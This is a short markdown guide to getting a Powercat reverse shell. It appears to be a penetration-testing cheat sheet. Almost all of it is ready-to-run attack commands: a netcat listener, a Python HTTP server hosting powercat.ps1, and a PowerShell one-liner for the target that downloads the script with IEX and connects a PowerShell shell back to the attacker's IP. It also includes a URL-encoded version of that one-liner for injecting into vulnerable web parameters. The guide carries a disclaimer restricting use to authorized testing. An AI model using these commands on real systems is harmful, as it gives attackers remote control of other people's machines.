# 🐱 Powercat Reverse Shell Guide

> **⚠️ DISCLAIMER:**  
> This guide is intended for educational purposes and **authorized** penetration testing only. Do not use it in environments where you lack permission.

* * *

## 📄 Step-by-Step Instructions

### 📥 1. Copy Powercat to Your Current Directory

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

* * *

### 📡 2. Set Up a Netcat Listener

```bash
nc -nvlp 4444
```

* * *

### 🌐 3. Start a Simple HTTP Server on Port 80

```bash
python3 -m http.server 80
```

This will host `powercat.ps1` for remote download.

* * *

### 🧠 4. Execute Powercat Remotely Using PowerShell

On the **target machine**, run:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

- This line:
    - Downloads `powercat.ps1` from your HTTP server
    - Initiates a reverse shell connection back to your listener on port `4444`

* * *

### 🔐 5. URL Encode Special Characters (If Needed)

If you're embedding this command in a web request or injecting it into a vulnerable parameter, you may need to encode:

- `:` becomes `%3A`
- `;` becomes `%3B`

**Example (URL Encoded):**

```
IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A//192.168.119.3/powercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell
```

* * *

## 📚 Source

- Original Powercat Tool: https://github.com/besimorhino/powercat

* * *

## 🧠 Notes

- Ensure PowerShell is available on the target.
- This reverse shell requires outbound access to your IP and port.

Always get **explicit authorization** before performing tests. Red team responsibly. 🛡️
